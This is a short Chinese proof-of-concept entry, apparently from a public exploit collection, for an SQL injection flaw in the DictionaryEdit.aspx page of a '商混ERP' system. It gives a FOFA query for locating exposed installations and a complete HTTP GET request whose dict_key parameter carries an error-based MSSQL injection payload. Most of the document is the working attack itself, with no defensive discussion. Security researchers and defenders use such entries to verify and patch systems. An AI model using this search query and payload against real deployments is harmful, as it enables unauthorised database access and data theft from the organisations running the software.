## 商混ERP-DictionaryEdit.aspxSQL注入漏洞

## fofa
```
title="商混ERP系统"
```

## poc
```
GET /Sys/DictionaryEdit.aspx?dict_key=1%27%20and%201=convert(varchar(100),substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32))-- HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0
```

![1b7bdddf5e50c3666285f6e2f366df73](https://github.com/wy876/POC/assets/139549762/e5872135-ff83-4e8a-a260-049034511ce9)
